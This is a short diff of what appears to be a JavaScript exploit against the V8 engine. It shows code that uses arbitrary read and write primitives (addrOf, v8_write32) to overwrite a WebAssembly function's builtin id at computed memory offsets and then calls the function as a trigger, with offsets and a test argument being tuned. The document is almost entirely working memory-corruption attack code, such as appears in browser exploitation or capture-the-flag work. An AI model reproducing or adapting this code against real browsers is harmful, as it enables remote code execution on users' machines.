@@ -94,7 +94,7 @@ console.log("0x" + id_builtins_function.toString(16));
 // 1027
 // 0x2000 -> call jit
 // console.log(arguments[0]);
-v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1717)*0x200);
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x143e)*0x200);
 // v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x1035)*0x200);
 console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
 
@@ -104,5 +104,6 @@ v8_write32(0x1816c9n + 3n, 0x400600);
 // v8_write64(0x200145n - 1n, 0x4141414142424242n);
 
 // trigger
-instance.exports.func1(Number(target_page+1n));
-
+// target_page
+instance.exports.func1(0x4141414141n);
+// instance.exports.func1(123n);
